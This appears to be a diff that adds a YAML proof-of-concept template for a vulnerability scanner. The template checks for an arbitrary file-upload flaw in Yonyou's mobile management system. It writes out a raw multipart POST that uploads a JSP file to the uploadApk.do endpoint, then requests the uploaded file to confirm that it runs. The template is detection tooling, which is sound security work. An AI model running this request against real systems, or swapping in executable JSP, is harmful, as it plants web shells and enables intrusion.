@@ -1,0 +1,37 @@
+id: poc-yaml-yy-mobile-management-system-file-upload
+info:
+  name: 用友-移动管理系统 任意文件上传漏洞
+  severity: high
+  tags:
+  - 文件上传
+  finger: 用友 移动管理系统
+variables:
+  t1: md5(123)
+requests:
+- raw: 'POST /maportal/appmanager/uploadApk.do?pk_obj= HTTP/1.1
+
+    Host:
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML,
+    like Gecko) Chrome/116.0.5845.111 Safari/537.36
+
+    Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryvLTG6zlX0gZ8LzO3
+
+
+    ------WebKitFormBoundaryvLTG6zlX0gZ8LzO3
+
+    Content-Disposition: form-data; name="downloadpath"; filename="a.jsp"
+
+    Content-Type: application/msword
+
+
+    {{.t1}}
+
+
+    ------WebKitFormBoundaryvLTG6zlX0gZ8LzO3--'
+  expression: status_code == 200 && contains(body,"status") && contains(body,"2")
+    && content_type == "application/json;charset=UTF-8"
+- method: GET
+  path: /maupload/apk/a.jsp
+  expression: status_code == 200 && contains(body,t1) && content_type == "text/html;charset=ISO-8859-1"
+transport: http
